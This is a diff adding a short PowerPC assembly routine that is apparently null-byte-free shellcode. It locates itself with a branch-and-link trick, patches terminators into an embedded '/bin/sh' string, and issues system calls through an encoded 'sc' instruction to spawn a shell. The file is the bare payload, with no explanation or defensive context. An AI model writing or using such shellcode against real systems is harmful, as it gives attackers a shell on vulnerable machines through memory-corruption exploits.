@@ -1,0 +1,34 @@
+    .section ".text"
+    .align 2
+    .globl m
+    .type    m,@function
+m:	xor  6,6,6
+	cmpi  7,0,6,0x7FFF
+    bc 13,28,L2
+L1: mfspr 3,8
+	sth  6,-7(3)
+	sth  6,-15(3)
+	addi 4,6,0x7FF0
+	addi 5,6,0x7FF4
+	addi 7,6,0x7FF3
+	xor  5,5,4
+	xor  7,7,4
+	add  4,5,7
+	stbx 6,4,3
+	add  0,4,5
+    sub  7,5,7
+    add  4,5,5
+    stwx 3,3,4
+	add  4,3,4
+	stwx 6,5,4
+    xor 5,5,5
+    .long   0x44ffff02
+	or 0,7,7
+    .long   0x44ffff02
+ L2:  bl L1
+      .long 0x2F62696E
+      .long 0x2F73685A
+      .long 0xffffffff
+      .long 0xffffffff
+.Lfe1:
+    .size    m,.Lfe1-m
